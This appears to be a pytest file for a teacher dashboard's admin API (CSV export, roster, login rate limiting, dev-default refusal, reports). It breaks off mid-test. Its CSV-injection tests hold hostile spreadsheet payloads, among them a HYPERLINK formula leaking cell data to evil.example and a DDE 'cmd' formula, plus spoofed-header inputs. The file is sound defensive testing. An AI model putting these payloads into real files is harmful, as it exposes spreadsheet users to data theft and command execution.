"""Teacher dashboard hardening (Phase 13): the admin API behind the new UI.

Covers: CSV export (BOM + Cyrillic + per-skill, stored data only), bulk roster add
with dedupe, delete / unpublish guards (409 unless force), test stats, the login
rate limit, the dev-default-secret refusal, reopen with extra time (+ the
"reopened" status instead of a stale grade), the printable student report (no
integrity data, no grading/LLM), manual marks without a grading pass, and the
batched per-test results reads.
"""

from __future__ import annotations

import csv
import io
import logging
import threading
import time
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from app.admin import (
    AdminService,
    LoginRateLimiter,
    build_admin_service,
    insecure_defaults,
    is_local_request,
    is_loopback_host,
)
from app.admin.service import REOPENED, AdminStateError, _csv_text
from app.analysis import MockAnalysisLLM
from app.content import FilesystemStorage
from app.core.config import (
    DEV_ADMIN_TOKEN_SECRET,
    DEV_ENVIRONMENTS,
    DEV_TEACHER_PASSWORD,
    Settings,
)
from app.core.db import get_session
from app.persistence.repository import AttemptRepository, EventRepository
from apps.api import admin as admin_api
from apps.api.main import app
from contracts import (
    Answer,
    Attempt,
    AttemptReport,
    GradingResult,
    IntegrityEvent,
    ItemGrade,
    OpenWritingItem,
    PassageTextStimulus,
    RosterEntry,
    Section,
    SingleChoiceItem,
    SkillReport,
    TextOption,
)
from contracts import Test as ExamTest

PASSWORD = "dash-teacher-pw"
LOOPBACK = ("127.0.0.1", 50000)  # the teacher's browser on the server machine
REMOTE = ("203.0.113.7", 40000)  # any other device / the far end of a tunnel
T0 = datetime(2026, 6, 21, 12, 0, 0, tzinfo=UTC)


# --------------------------------------------------------------------------- #
# Builders.
# --------------------------------------------------------------------------- #
def _test(test_id: str = "t1", *, status: str = "published") -> ExamTest:
    """Reading (2 single-choice) + Writing (1 open task)."""
    return ExamTest(
        id=test_id,
        title="A2 Key — пробный тест",
        level="A2_KEY",
        status=status,  # type: ignore[arg-type]
        duration_minutes=60,
        sections=[
            Section(
                id=f"{test_id}-r",
                title="Reading Part 1",
                skill="reading",
                stimulus=PassageTextStimulus(text="Read."),
                items=[
                    SingleChoiceItem(
                        id=f"{test_id}-q{n}",
                        prompt="?",
                        options=[TextOption(key="A", text="a"), TextOption(key="B", text="b")],
                        correct="A",
                    )
                    for n in (1, 2)
                ],
            ),
            Section(
                id=f"{test_id}-w",
                title="Writing Part 6",
                skill="writing",
                stimulus=PassageTextStimulus(text="Write an email."),
                items=[
                    OpenWritingItem(
                        id=f"{test_id}-w1",
                        prompt="Write to Pat.",
                        word_min=25,
                        bullet_points=["where", "when"],
                        rubric="r",
                    )
                ],
            ),
        ],
    )


def _svc(session: Session, tmp_path) -> AdminService:
    return build_admin_service(session, FilesystemStorage(tmp_path), analysis_llm=MockAnalysisLLM())


def _seed(
    session: Session,
    *,
    name: str,
    test_id: str = "t1",
    status: str = "submitted",
    answers: dict[str, str] | None = None,
    deadline: datetime = T0 + timedelta(hours=1),
    events: int = 1,
) -> str:
    repo = AttemptRepository(session)
    entry = RosterEntry(id=f"{test_id}-{name}", test_id=test_id, display_name=name)
    repo.add_roster_entry(entry)
    attempt_id = f"att-{test_id}-{name}"
    repo.add_attempt(
        Attempt(
            id=attempt_id,
            test_id=test_id,
            roster_entry_id=entry.id,
            status=status,  # type: ignore[arg-type]
            seed=1,
            started_at=T0,
            submitted_at=T0 + timedelta(minutes=30) if status == "submitted" else None,
            deadline=deadline,
        )
    )
    repo.update_roster_entry(entry.model_copy(update={"status": status, "attempt_id": attempt_id}))
    for item_id, resp in (answers or {f"{test_id}-q1": "A"}).items():
        repo.save_answer(
            Answer(attempt_id=attempt_id, item_id=item_id, response=resp, answered_at=T0)
        )
    ev = EventRepository(session)
    for i in range(events):
        ts = T0 + timedelta(seconds=i)
        ev.add_event(
            IntegrityEvent(
                attempt_id=attempt_id, item_id=f"{test_id}-q1", type="interaction",
                client_ts=ts, server_ts=ts,
            )
        )
    session.commit()
    return attempt_id


def _report(session: Session, attempt_id: str, *, q1: float, q2: float, w1: float) -> None:
    """Persist a frozen report directly (independent of the results engine)."""
    items = [
        ItemGrade(item_id="t1-q1", awarded=q1, max_points=1, method="single_choice"),
        ItemGrade(item_id="t1-q2", awarded=q2, max_points=1, method="single_choice"),
        ItemGrade(
            item_id="t1-w1", awarded=w1, max_points=5, method="open_writing_llm",
            feedback="Хорошая структура письма.",
        ),
    ]
    AttemptRepository(session).upsert_report(
        AttemptReport(
            attempt_id=attempt_id,
            graded_at=T0 + timedelta(hours=2),
            status="complete",
            grading=GradingResult(
                attempt_id=attempt_id, items=items,
                score=q1 + q2 + w1, max_score=7,
            ),
            skills=[
                SkillReport(skill="reading", score=q1 + q2, max_score=2,
                            strengths="Внимательно читает.", weaknesses="Part 1 — знаки."),
                SkillReport(skill="writing", score=w1, max_score=5,
                            strengths="Все пункты раскрыты.", weaknesses="Артикли."),
            ],
            summary="Хороший результат.",
        )
    )
    session.commit()


@pytest.fixture
def client(session: Session, tmp_path, monkeypatch: pytest.MonkeyPatch) -> Iterator[TestClient]:
    monkeypatch.setattr(admin_api.settings, "teacher_password", PASSWORD)
    # The token secret stays on its dev default here, which the admin API tolerates
    # only in an explicit dev/test environment for a request from this machine.
    monkeypatch.setattr(admin_api.settings, "environment", "test")
    admin_api.login_limiter.reset()
    app.dependency_overrides[get_session] = lambda: session

    def _dep() -> Iterator[AdminService]:
        yield _svc(session, tmp_path)

    app.dependency_overrides[admin_api.get_admin_service] = _dep
    try:
        yield TestClient(app, client=LOOPBACK)
    finally:
        app.dependency_overrides.clear()
        admin_api.login_limiter.reset()


def _headers(client: TestClient) -> dict[str, str]:
    token = client.post("/admin/login", json={"password": PASSWORD}).json()["token"]
    return {"Authorization": f"Bearer {token}"}


# --------------------------------------------------------------------------- #
# CSV export.
# --------------------------------------------------------------------------- #
def test_results_csv_bom_cyrillic_and_per_skill(
    client: TestClient, session: Session, tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    graded = _seed(session, name="Иван Судев", events=3)
    _report(session, graded, q1=1, q2=0, w1=3)
    _seed(session, name="Мария", status="in_progress", events=0)  # no report yet

    # The export must never grade (nor call an LLM): any grading pass would blow up.
    from app.grading.service import GradingService

    def _boom(*a, **k):
        raise AssertionError("CSV export must not run grading")

    monkeypatch.setattr(GradingService, "grade", _boom)

    resp = client.get("/admin/tests/t1/results.csv", headers=headers)
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    assert "attachment" in resp.headers["content-disposition"]
    raw = resp.content
    assert raw.startswith(b"\xef\xbb\xbf")  # UTF-8 BOM: Excel opens Cyrillic correctly
    text = raw.decode("utf-8-sig")
    lines = text.split("\r\n")
    assert lines[0] == (
        "student,status,submitted_at,score,max,percent,reading_score,reading_max,"
        "listening_score,listening_max,writing_score,writing_max,report_status,"
        "suspicion_score,event_count"
    )
    rows = {line.split(",")[0]: line.split(",") for line in lines[1:] if line}
    ivan = rows["Иван Судев"]
    assert ivan[1] == "submitted" and ivan[2].startswith("2026-06-21T12:30")
    assert ivan[3:6] == ["4", "7", "57.1"]
    assert ivan[6:12] == ["1", "2", "", "", "3", "5"]  # no listening section -> blank
    assert ivan[12] == "complete" and ivan[14] == "3"
    maria = rows["Мария"]
    assert maria[1] == "in_progress" and maria[3:12] == [""] * 9  # nothing graded yet
    assert maria[12] == "pending"


def test_results_csv_applies_manual_marks_and_requires_auth(
    client: TestClient, session: Session, tmp_path
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    aid = _seed(session, name="Ann")
    _report(session, aid, q1=1, q2=1, w1=0)
    svc.set_manual_grade(aid, "t1-w1", 4)
    session.commit()
    assert client.get("/admin/tests/t1/results.csv").status_code == 401
    text = client.get("/admin/tests/t1/results.csv", headers=_headers(client)).content.decode(
        "utf-8-sig"
    )
    ann = text.split("\r\n")[1].split(",")
    assert ann[3:5] == ["6", "7"] and ann[10:12] == ["4", "5"]  # the teacher's 4/5 counts
    assert client.get("/admin/tests/nope/results.csv", headers=_headers(client)).status_code == 404


# --------------------------------------------------------------------------- #
# Bulk roster add.
# --------------------------------------------------------------------------- #
def test_bulk_add_dedupes_and_reports_skipped(
    client: TestClient, session: Session, tmp_path, caplog: pytest.LogCaptureFixture
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    svc.add_student("t1", "Аня")
    session.commit()

    with caplog.at_level(logging.INFO):
        resp = client.post(
            "/admin/tests/t1/roster/bulk",
            json={"names": ["  Борис ", "", "Аня", "Вика", "Борис", "   "]},
            headers=headers,
        )
    assert resp.status_code == 200
    body = resp.json()
    assert [e["display_name"] for e in body["added"]] == ["Борис", "Вика"]
    assert body["skipped"] == ["Аня", "Борис"]  # already on roster / repeated in request
    roster = client.get("/admin/tests/t1/roster", headers=headers).json()
    names = sorted(r["display_name"] for r in roster)
    assert names == ["Аня", "Борис", "Вика"]
    assert any("add_students_bulk" in r.message and "added=2" in r.message for r in caplog.records)
    # Unknown test -> 404; unauthenticated -> 401.
    unknown = client.post("/admin/tests/x/roster/bulk", json={"names": ["A"]}, headers=headers)
    assert unknown.status_code == 404
    assert client.post("/admin/tests/t1/roster/bulk", json={"names": ["A"]}).status_code == 401


# --------------------------------------------------------------------------- #
# Delete / unpublish guards + stats.
# --------------------------------------------------------------------------- #
def test_delete_test_refuses_with_attempts_unless_forced(
    client: TestClient, session: Session, tmp_path
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test("t1"))
    svc.content.create_test(_test("t2"))
    session.commit()
    aid = _seed(session, name="Ann")
    _report(session, aid, q1=1, q2=1, w1=1)
    svc.add_student("t1", "Без попытки")
    session.commit()

    stats = client.get("/admin/tests/t1/stats", headers=headers).json()
    assert stats == {"test_id": "t1", "roster_count": 2, "attempt_count": 1, "active_count": 0}

    resp = client.delete("/admin/tests/t1", headers=headers)
    assert resp.status_code == 409
    assert "работы учеников (1)" in resp.json()["detail"]
    assert client.get("/admin/tests/t1", headers=headers).status_code == 200  # untouched

    assert client.delete("/admin/tests/t1?force=true", headers=headers).status_code == 204
    assert client.get("/admin/tests/t1", headers=headers).status_code == 404
    repo = AttemptRepository(session)
    assert repo.get_attempt(aid) is None and repo.get_report(aid) is None
    assert repo.list_roster_entries("t1") == []

    # A test with no attempts deletes without force.
    assert client.delete("/admin/tests/t2", headers=headers).status_code == 204
    assert client.delete("/admin/tests/t2", headers=headers).status_code == 404


def test_unpublish_refuses_while_students_are_writing(
    client: TestClient, session: Session, tmp_path
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    _seed(session, name="Ann", status="in_progress")
    assert client.get("/admin/tests/t1/stats", headers=headers).json()["active_count"] == 1

    resp = client.post("/admin/tests/t1/unpublish", headers=headers)
    assert resp.status_code == 409 and "пишут ученики (1)" in resp.json()["detail"]
    resp = client.post("/admin/tests/t1/unpublish?force=true", headers=headers)
    assert resp.status_code == 200 and resp.json()["status"] == "draft"
    # Already a draft -> still a 409 (state), even with force.
    assert client.post("/admin/tests/t1/unpublish?force=true", headers=headers).status_code == 409


def test_unpublish_without_active_attempts_needs_no_force(session: Session, tmp_path) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    _seed(session, name="Done")  # submitted, not active
    assert svc.unpublish("t1").status == "draft"
    with pytest.raises(AdminStateError):
        svc.unpublish("t1")


# --------------------------------------------------------------------------- #
# Auth hardening: rate limit + dev-default refusal.
# --------------------------------------------------------------------------- #
def test_login_rate_limit_per_ip(client: TestClient, caplog: pytest.LogCaptureFixture) -> None:
    with caplog.at_level(logging.WARNING):
        for _ in range(admin_api.login_limiter.max_failures):
            resp = client.post("/admin/login", json={"password": "wrong"})
            assert resp.status_code == 401 and resp.json()["detail"] == "Неверный пароль."
        locked = client.post("/admin/login", json={"password": PASSWORD})
    # Even the right password is refused while locked out.
    assert locked.status_code == 429
    assert int(locked.headers["Retry-After"]) > 0
    assert "Слишком много" in locked.json()["detail"]
    assert any("rate-limited" in r.message and r.levelno == logging.WARNING for r in caplog.records)
    assert any("bad password" in r.message for r in caplog.records)

    admin_api.login_limiter.reset()
    assert client.post("/admin/login", json={"password": PASSWORD}).status_code == 200


def test_login_success_clears_failures(
    client: TestClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(
        admin_api,
        "login_limiter",
        LoginRateLimiter(max_failures=5, window_seconds=300, global_max_failures=30),
    )
    for _ in range(4):
        client.post("/admin/login", json={"password": "wrong"})
    assert client.post("/admin/login", json={"password": PASSWORD}).status_code == 200
    for _ in range(4):  # the counter restarted after the good login
        assert client.post("/admin/login", json={"password": "wrong"}).status_code == 401
    assert client.post("/admin/login", json={"password": PASSWORD}).status_code == 200


def test_rate_limiter_window_slides() -> None:
    lim = LoginRateLimiter(max_failures=2, window_seconds=60)
    assert lim.retry_after("ip", now=0) == 0
    lim.record_failure("ip", now=0)
    lim.record_failure("ip", now=10)
    assert lim.retry_after("ip", now=20) == 41  # until the t=0 failure ages out
    assert lim.retry_after("other", now=20) == 0  # per key
    assert lim.retry_after("ip", now=60) == 0  # t=0 dropped -> 1 failure left


def test_insecure_defaults_detection() -> None:
    def check(env: str, pw: str, secret: str, *, local: bool) -> list[str]:
        return insecure_defaults(
            environment=env, teacher_password=pw, admin_token_secret=secret,
            dev_password=DEV_TEACHER_PASSWORD, dev_secret=DEV_ADMIN_TOKEN_SECRET,
            dev_environments=DEV_ENVIRONMENTS, local_request=local,
        )

    both = ["TEACHER_PASSWORD", "ADMIN_TOKEN_SECRET"]
    # The dev defaults pass ONLY in an explicit dev/test env AND for a local request.
    assert check("dev", DEV_TEACHER_PASSWORD, DEV_ADMIN_TOKEN_SECRET, local=True) == []
    assert check(" Test ", DEV_TEACHER_PASSWORD, DEV_ADMIN_TOKEN_SECRET, local=True) == []
    assert check("dev", DEV_TEACHER_PASSWORD, DEV_ADMIN_TOKEN_SECRET, local=False) == both
    assert check("test", DEV_TEACHER_PASSWORD, DEV_ADMIN_TOKEN_SECRET, local=False) == both
    for env in ("prod", "production", "docker", "", "development"):
        assert check(env, DEV_TEACHER_PASSWORD, DEV_ADMIN_TOKEN_SECRET, local=True) == both
    # One overridden is not enough: a default token secret alone is still forgeable.
    assert check("production", "strong", DEV_ADMIN_TOKEN_SECRET, local=True) == [
        "ADMIN_TOKEN_SECRET"
    ]
    assert check("dev", "strong", DEV_ADMIN_TOKEN_SECRET, local=False) == ["ADMIN_TOKEN_SECRET"]
    assert check("dev", DEV_TEACHER_PASSWORD, "strong", local=False) == ["TEACHER_PASSWORD"]
    # Both overridden: fine anywhere, from anyone.
    assert check("prod", "strong", "also-strong", local=False) == []
    # The parameter itself defaults to the safe side.
    assert insecure_defaults(
        environment="dev", teacher_password=DEV_TEACHER_PASSWORD,
        admin_token_secret=DEV_ADMIN_TOKEN_SECRET, dev_password=DEV_TEACHER_PASSWORD,
        dev_secret=DEV_ADMIN_TOKEN_SECRET, dev_environments=DEV_ENVIRONMENTS,
    ) == both


def test_login_and_tokens_refused_on_dev_defaults_outside_dev(
    client: TestClient, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    good = _headers(client)  # minted while still in "test", from loopback
    monkeypatch.setattr(admin_api.settings, "environment", "prod")
    monkeypatch.setattr(admin_api.settings, "teacher_password", DEV_TEACHER_PASSWORD)
    with caplog.at_level(logging.ERROR):
        resp = client.post("/admin/login", json={"password": DEV_TEACHER_PASSWORD})
        assert resp.status_code == 503 and "TEACHER_PASSWORD" in resp.json()["detail"]
        # The default secret is public: an existing token proves nothing either.
        assert client.get("/admin/tests", headers=good).status_code == 503
    assert any(r.levelno == logging.ERROR and "REFUSED" in r.message for r in caplog.records)

    # Overriding both restores the surface.
    monkeypatch.setattr(admin_api.settings, "teacher_password", "a-real-password")
    monkeypatch.setattr(admin_api.settings, "admin_token_secret", "a-real-secret")
    assert client.post("/admin/login", json={"password": "a-real-password"}).status_code == 200


# --------------------------------------------------------------------------- #
# Reopen with extra time + "reopened" instead of the stale grade.
# --------------------------------------------------------------------------- #
def _expire(session: Session) -> list[str]:
    from app.delivery import DeliveryService
    from app.persistence.repository import ContentRepository

    ids = DeliveryService(ContentRepository(session), AttemptRepository(session)).expire_overdue(
        datetime.now(UTC), test_id="t1"
    )
    session.commit()
    return ids


def test_reopen_with_extension_sets_new_deadline(
    session: Session, tmp_path, caplog: pytest.LogCaptureFixture
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    aid = _seed(session, name="Late", status="in_progress")
    assert _expire(session) == [aid]  # deadline (T0 + 1h) long past

    now = datetime.now(UTC)
    with caplog.at_level(logging.INFO):
        row = svc.reopen_attempt("t1-Late", extend_minutes=15, now=now)
    session.commit()
    assert row.status == "in_progress" and row.deadline == now + timedelta(minutes=15)
    attempt = AttemptRepository(session).get_attempt(aid)
    assert attempt.status == "in_progress" and attempt.deadline == now + timedelta(minutes=15)
    assert any("TEACHER EXTENDED" in r.message and "+15 min" in r.message for r in caplog.records)
    # The extension holds: the expiry sweep no longer closes it.
    assert _expire(session) == []
    assert svc.roster_status("t1")[0].deadline == now + timedelta(minutes=15)


def test_reopen_extension_never_shortens(session: Session, tmp_path) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    far = datetime.now(UTC) + timedelta(hours=3)
    aid = _seed(session, name="Early", deadline=far)
    svc.reopen_attempt("t1-Early", extend_minutes=5)
    session.commit()
    assert AttemptRepository(session).get_attempt(aid).deadline == far


def test_reopen_endpoint_body_optional_and_validated(
    client: TestClient, session: Session, tmp_path
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    aid = _seed(session, name="Ann")
    # No body: the original deadline is kept (old behaviour).
    resp = client.post("/admin/roster/t1-Ann/reopen", headers=headers)
    assert resp.status_code == 200
    assert AttemptRepository(session).get_attempt(aid).deadline == T0 + timedelta(hours=1)
    # Invalid extension -> 422; valid -> new deadline in the response.
    bad = client.post("/admin/roster/t1-Ann/reopen", json={"extend_minutes": 0}, headers=headers)
    assert bad.status_code == 422
    ok = client.post("/admin/roster/t1-Ann/reopen", json={"extend_minutes": 20}, headers=headers)
    assert ok.status_code == 200
    deadline = datetime.fromisoformat(ok.json()["deadline"])
    assert abs((deadline - datetime.now(UTC)) - timedelta(minutes=20)) < timedelta(seconds=30)
    # Unknown entry -> 404 with a Russian message.
    missing = client.post("/admin/roster/nope/reopen", headers=headers)
    assert missing.status_code == 404 and "не найден" in missing.json()["detail"]


def test_reopened_attempt_shows_reopened_not_stale_grade(
    session: Session, tmp_path, client: TestClient
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    aid = _seed(session, name="Ann")
    _report(session, aid, q1=1, q2=1, w1=5)
    assert svc.results_for_test("t1")[0].report_status == "complete"

    svc.reopen_attempt("t1-Ann", extend_minutes=10)
    session.commit()
    [row] = svc.results_for_test("t1")
    assert row.report_status == REOPENED and row.attempt_status == "in_progress"
    assert row.submitted_at is None
    assert svc.attempt_result(aid).report_status == REOPENED
    assert svc.student_report(aid).report_status == REOPENED
    csv_row = svc.results_csv("t1").split("\r\n")[1].split(",")
    assert csv_row[3:6] == ["", "", ""] and csv_row[12] == REOPENED


# --------------------------------------------------------------------------- #
# Printable student report.
# --------------------------------------------------------------------------- #
def test_student_report_has_scores_feedback_writing_and_no_integrity(
    client: TestClient, session: Session, tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    headers = _headers(client)
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    text = "Hi Pat, let's meet at the bus stop at three. Bring some food please. See you soon!"
    aid = _seed(session, name="Соня", answers={"t1-q1": "A", "t1-q2": "B", "t1-w1": text})
    _report(session, aid, q1=1, q2=0, w1=3)
    svc.set_manual_grade(aid, "t1-w1", 4)
    session.commit()

    # Neither grading nor the integrity analysis may run for the parent report.
    from app.analysis import AnalysisService
    from app.grading.service import GradingService

    def _boom(*a, **k):
        raise AssertionError("student report must not grade / analyse")

    monkeypatch.setattr(GradingService, "grade", _boom)
    monkeypatch.setattr(AnalysisService, "analyze", _boom)

    resp = client.get(f"/admin/results/{aid}/report", headers=headers)
    assert resp.status_code == 200
    r = resp.json()
    assert r["display_name"] == "Соня" and r["level"] == "A2_KEY"
    assert r["test_title"] == "A2 Key — пробный тест"
    assert (r["score"], r["max_score"]) == (5, 7)
    skills = {s["skill"]: s for s in r["skills"]}
    assert (skills["reading"]["score"], skills["reading"]["max_score"]) == (1, 2)
    assert skills["reading"]["weaknesses"] == "Part 1 — знаки."
    assert (skills["writing"]["score"], skills["writing"]["max_score"]) == (4, 5)
    [w] = r["writing"]
    assert w["text"] == text and w["word_count"] == len(text.split())
    assert (w["awarded"], w["max_points"], w["manual"], w["graded"]) == (4, 5, True, True)
    assert r["summary"] == "Хороший результат."
    # No integrity data of any kind on the student/parent report.
    blob = resp.text.lower()
    for word in ("suspicion", "verdict", "events", "profile", "device", "flags"):
        assert word not in blob
    assert client.get("/admin/results/nope/report", headers=headers).status_code == 404


def test_teacher_report_page_is_served() -> None:
    page = TestClient(app).get("/web/teacher-report.html")
    assert page.status_code == 200
    assert "/admin/results/" in page.text and "@page" in page.text
    assert "suspicion" not in page.text


# --------------------------------------------------------------------------- #
# Manual marks without a grading pass; batched per-test reads.
# --------------------------------------------------------------------------- #
def test_set_manual_grade_reads_max_points_without_grading(
    session: Session, tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    reported = _seed(session, name="Rep")
    _report(session, reported, q1=1, q2=1, w1=0)
    bare = _seed(session, name="Bare", answers={"t1-q1": "A", "t1-w1": "my text"})

    calls: list[str] = []
    real = svc.grading.grade

    def counting(attempt_id: str):
        calls.append(attempt_id)
        return real(attempt_id)

    monkeypatch.setattr(svc.grading, "grade", counting)
    # With a stored report: no grading at all (max from the frozen grade).
    assert svc.set_manual_grade(reported, "t1-w1", 5).grading.score == 7
    assert calls == []
    # Without a report: max from the item definition (writing 5, objective 1); the
    # only grade() is the detail view's existing deterministic fallback afterwards.
    assert svc._item_max_points(svc.attempts.get_attempt(bare), "t1-w1") == 5
    assert svc._item_max_points(svc.attempts.get_attempt(bare), "t1-q2") == 1
    assert svc._item_max_points(svc.attempts.get_attempt(bare), "nope") is None
    from app.admin.service import AdminValidationError

    with pytest.raises(AdminValidationError):
        svc.set_manual_grade(bare, "t1-q1", 2)
    assert calls == []  # validation never graded
    svc.set_manual_grade(bare, "t1-w1", 3)
    assert calls == [bare]  # just the returned detail's fallback grade


def test_results_for_test_batches_per_student_queries(
    session: Session, tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    ids = [_seed(session, name=f"S{i}", events=i + 1) for i in range(4)]
    for aid in ids:
        _report(session, aid, q1=1, q2=0, w1=2)
    svc.set_manual_grade(ids[0], "t1-w1", 5)
    session.commit()

    def _boom(*a, **k):
        raise AssertionError("per-student query in the polled results view")

    for name in ("get_attempt", "count_events", "list_manual_grades"):
        monkeypatch.setattr(svc.attempts, name, _boom)
    rows = {o.attempt_id: o for o in svc.results_for_test("t1")}
    assert [rows[a].event_count for a in ids] == [1, 2, 3, 4]
    assert rows[ids[0]].score == 6 and rows[ids[1]].score == 3  # manual mark applied
    assert all(o.submitted_at is not None for o in rows.values())
    # The roster view is batched too (deadline from one attempts query).
    assert all(r.deadline is not None for r in svc.roster_status("t1"))


# --------------------------------------------------------------------------- #
# Review hardening: CSV injection, fail-closed dev defaults, the login limiter,
# reopen state check, the exact extension deadline.
# --------------------------------------------------------------------------- #
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r", "\n", "＝", "＋", "－", "＠")


def test_csv_text_neutralises_formula_prefixes() -> None:
    for start in _FORMULA_STARTS:
        assert _csv_text(f"{start}1+1") == f"'{start}1+1"
    # Ordinary names are untouched (a later `=` / `-` is harmless).
    for plain in ("Иван Судев", "Anna-Maria", "a=b", "O'Brien", " =padded", "7", ""):
        assert _csv_text(plain) == plain
    assert _csv_text(None) == ""


def test_results_csv_never_emits_a_formula_cell(session: Session, tmp_path) -> None:
    """A student named `=HYPERLINK(...)` must open in Excel as text, not a formula."""
    svc = _svc(session, tmp_path)
    svc.content.create_test(_test())
    session.commit()
    hostile = [
        '=HYPERLINK("http://evil.example/?x="&A1,"нажми")',
        "+1+1",
        "-2+3",
        "@SUM(1,2)",
        "\t=1+1",
        "\r=1+1",
        "＝cmd|' /C calc'!A0",
    ]
    for name in hostile:
        _report(session, _seed(session, name=name), q1=1, q2=1, w1=4)
    _seed(session, name="Иван Судев")

    rows = list(csv.reader(io.StringIO(svc.results_csv("t1"), newline="")))
    students = [r[0] for r in rows[1:]]
    for name in hostile:
        assert f"'{name}" in students, f"{name!r} was not neutralised"
        assert name not in students
    assert "Иван Судев" in students  # an ordinary name is exported verbatim
    for row in rows[1:]:
        assert len(row) == len(rows[0])  # quoting kept every hostile name in ONE cell
        for cell in row:
            assert not cell.startswith(_FORMULA_STARTS), f"formula-leading cell: {cell!r}"
    # Scores are unaffected by the escaping.
    graded = next(r for r in rows[1:] if r[0] == "'+1+1")
    assert graded[3:6] == ["6", "7", "85.7"]


# -- dev-default guard: fail-closed ------------------------------------------- #
def test_environment_is_not_dev_unless_explicitly_set(monkeypatch: pytest.MonkeyPatch) -> None:
    for var in ("ENVIRONMENT", "TEACHER_PASSWORD", "ADMIN_TOKEN_SECRET"):
        monkeypatch.delenv(var, raising=False)
    unset = Settings(_env_file=None)
    assert unset.environment.strip().lower() not in DEV_ENVIRONMENTS
    # ... so an unconfigured deployment is refused even from loopback.
    assert insecure_defaults(
        environment=unset.environment, teacher_password=unset.teacher_password,
        admin_token_secret=unset.admin_token_secret, dev_password=DEV_TEACHER_PASSWORD,
        dev_secret=DEV_ADMIN_TOKEN_SECRET, dev_environments=DEV_ENVIRONMENTS,
        local_request=True,
    ) == ["TEACHER_PASSWORD", "ADMIN_TOKEN_SECRET"]
    monkeypatch.setenv("ENVIRONMENT", "dev")
    assert Settings(_env_file=None).environment == "dev"


def test_local_request_detection() -> None:
    for host in ("127.0.0.1", "127.8.9.10", "::1", "::ffff:127.0.0.1"):
        assert is_loopback_host(host), host
    for host in (None, "", "testclient", "localhost", "unknown", "192.168.1.10", "10.0.0.1",
                 "203.0.113.7", "::ffff:10.0.0.1", "fe80::1%eth0", "127.0.0.1.evil.example"):
        assert not is_loopback_host(host), host

    assert is_local_request("127.0.0.1", [])
    assert is_local_request("::1", ["Host", "Authorization", "User-Agent"])
    assert not is_local_request("203.0.113.7", [])
    assert not is_local_request(None, [])
    # A tunnel agent / reverse proxy on this machine: loopback peer, but relayed.
    for header in ("X-Forwarded-For", "x-forwarded-host", "Forwarded", "X-Real-IP",
                   "CF-Connecting-IP", "Via"):
        assert not is_local_request("127.0.0.1", ["Host", header]), header


def test_dev_defaults_work_only_from_this_machine(
    client: TestClient, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """`make run` + a browser on the same machine logs in with the defaults; anything
    remote or relayed (a tunnel, a proxy, another device) is refused with 503."""
    monkeypatch.setattr(admin_api.settings, "environment", "dev")
    monkeypatch.setattr(admin_api.settings, "teacher_password", DEV_TEACHER_PASSWORD)
    creds = {"password": DEV_TEACHER_PASSWORD}

    local = client.post("/admin/login", json=creds)
    assert local.status_code == 200
    good = {"Authorization": f"Bearer {local.json()['token']}"}
    assert client.get("/admin/tests", headers=good).status_code == 200

    remote = TestClient(app, client=REMOTE)
    with caplog.at_level(logging.ERROR):
        refused = remote.post("/admin/login", json=creds)
        assert refused.status_code == 503
        assert "TEACHER_PASSWORD" in refused.json()["detail"]
        assert "localhost" in refused.json()["detail"]
        # A token signed with the public default secret proves nothing remotely.
        assert remote.get("/admin/tests", headers=good).status_code == 503
        # Loopback peer but relayed (ngrok / a reverse proxy): refused too.
        relayed = client.post(
            "/admin/login", json=creds, headers={"X-Forwarded-For": "203.0.113.7"}
        )
        assert relayed.status_code == 503
        assert (
            client.get("/admin/tests", headers={**good, "Forwarded": "for=203.0.113.7"}).status_code
            == 503
        )
        # Starlette's default test peer ("testclient") is not loopback either.
        assert TestClient(app).post("/admin/login", json=creds).status_code == 503
    assert any(
        r.levelno == logging.ERROR and "REFUSED" in r.message and "not local" in r.message
        for r in caplog.records
    )
    # A refusal is not a password guess: nothing was counted against anyone.
    assert admin_api.login_limiter.tracked_keys() == 0

    # A real password with the default token secret is still refused remotely...
    monkeypatch.setattr(admin_api.settings, "teacher_password", PASSWORD)
    assert remote.post("/admin/login", json={"password": PASSWORD}).status_code == 503
    # ...and overriding both opens the dashboard to remote clients.
    monkeypatch.setattr(admin_api.settings, "admin_token_secret", "a-real-secret")
    assert remote.post("/admin/login", json={"password": PASSWORD}).status_code == 200


def test_unset_environment_refuses_dev_defaults_even_from_loopback(
    client: TestClient, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """Fail-closed: a server that never set ENVIRONMENT is not a dev server."""
    monkeypatch.delenv("ENVIRONMENT", raising=False)
    monkeypatch.setattr(admin_api.settings, "environment", Settings(_env_file=None).environment)
    monkeypatch.setattr(admin_api.settings, "teacher_password", DEV_TEACHER_PASSWORD)
    with caplog.at_level(logging.ERROR):
